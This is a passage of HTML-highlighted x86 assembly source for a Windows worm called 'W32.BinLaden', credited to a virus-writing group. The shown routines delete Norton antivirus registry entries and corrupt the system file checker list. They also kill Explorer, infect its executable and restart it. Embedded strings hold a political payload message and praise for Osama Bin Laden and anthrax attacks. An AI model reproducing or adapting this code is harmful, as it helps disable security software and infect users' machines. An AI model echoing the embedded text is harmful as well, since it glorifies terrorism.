            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
            </span><span class="sc5">rnd_dword</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
            </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rnd_dword</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MainString</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ALA   DIO   GOTT   ZEUS   JEOVA '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'  KRISHNA   OXALA   DIEU   GOD  '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' SHIVA   TUPA   DIOS   DEUS'</span><span class="sc0">
</span><span class="sc5">StringSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">MainString</span><span class="sc0">

</span><span class="sc5">BushText1</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Worm/I-Worm/W32.BinLaden'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">BushText2</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Bush, you need more hashish in your life'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Why to take the Amazon from brazil. if y'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ou like polution ?'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Brazilian ppl wants the USA destruction, not like'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'our president, smelling Bush`s balls'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'You are not the cops of the world, and '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'World Trade Center was the first'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Now you take the freedom from your own people, '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'and the world is laughing ...'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc12">'Ohhhh is this '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'the famous American Way of Life ? HAHAHAHA !!!'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'BUGS EVERYWHERE'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'You kill more people per day than AIDS, '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'giving money and arms to other countries'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Now you are feeling the taste of your own poison...'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Ohhhhhh i am sorry ... It isn`t sweet ?'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ThePayload</span><span class="sc0">  </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">DeleteAntiV</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad327</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO ANTI-ANTIVIRUS'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OverVxdKey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'System\CurrentControlSet\Services\VxD\NAVAP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OverVxdKey</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegDeleteKeyA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OverRunKey</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Software\Microsoft\Windows\CurrentVersion\Run'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Norton Auto-Protect'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">OverRunKey</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCreateKeyA</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ERROR_SUCCESS</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">abortavdel</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegDeleteValueA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">sharehandle</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">
</span><span class="sc5">abortavdel</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SFCNotFound</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DefaultSFC</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\Default.sfc'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">DefaultSFC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenWrite</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SFCNotFound</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">ReplaceSTR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.*'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trashIT</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'exe.'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trashIT</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'lld.'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trashIT</span><span class="sc0">
</span><span class="sc5">SFCLoop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ReplaceSTR</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SFCClose</span><span class="sc0">
</span><span class="sc5">trashIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'x'</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SFCLoop</span><span class="sc0">
</span><span class="sc5">SFCClose</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DefaultSFC</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

</span><span class="sc5">SFCNotFound</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad431</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO ANTI-ANTIVIRUS'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DeleteAntiV</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Greetz: Alevirus, Satanicoder, Vecna, Z0mbie,'</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' all ppl in #vxers...and my TEAM'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'And of course, Osama Bin Laden. Keep the good job with Antrhax, man !'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'irc.undernet.org | #vxers'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'www.nbk.hpg.com.br'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'www.coderz.net/mtxvx'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Coded by NBK[MATRiX]'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Every brazilian HATES USA ... Just try to get Amazon FROM US'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">XpltXplorer</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">ToolHelp</span><span class="sc0"> </span><span class="sc5">PROCESSENTRY32</span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc5">ToolHelpHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CODESEG</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad7f3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO XPLOIT_EXPLORER'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ErrorXploit</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">InfExpRet</span><span class="sc0">
</span><span class="sc5">ErrorXploit</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ToolHelpHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfExpRet</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ToolHelp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.dwSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">PROCESSENTRY32</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ToolHelp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ToolHelpHandle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Process32First</span><span class="sc0">

</span><span class="sc5">checkfile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">InfExpRetCl</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ProcessID</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ToolHelp</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.th32ProcessID</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.szExeFile</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">FilesToFuck</span><span class="sc0">

            </span><span class="sc5">explorer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EXPLORER.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">FilesToFuck</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;     lstrcmpiA() arg.1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;     lstrcmpiA() arg.2</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcmpiA</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">JustDoIt</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

</span><span class="sc5">JustDoIt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenRead</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">DirectKill</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseFile</span><span class="sc0">

            </span><span class="sc1">;  Infected file ?</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ivct._file_size</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

</span><span class="sc5">DirectKill</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ToolHelp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.th32ProcessID</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">            </span><span class="sc1">;  Win32s</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">001F0FFFh</span><span class="sc0">       </span><span class="sc1">;  PROCESS_ALL_ACCESS</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OpenProcess</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">TerminateProcess</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">          </span><span class="sc1">;  wait 2 seconds (+/- 7 thread closing)</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Geral</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PlayFile</span><span class="sc0">

</span><span class="sc5">NextFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ToolHelp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ToolHelpHandle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Process32Next</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">checkfile</span><span class="sc0">

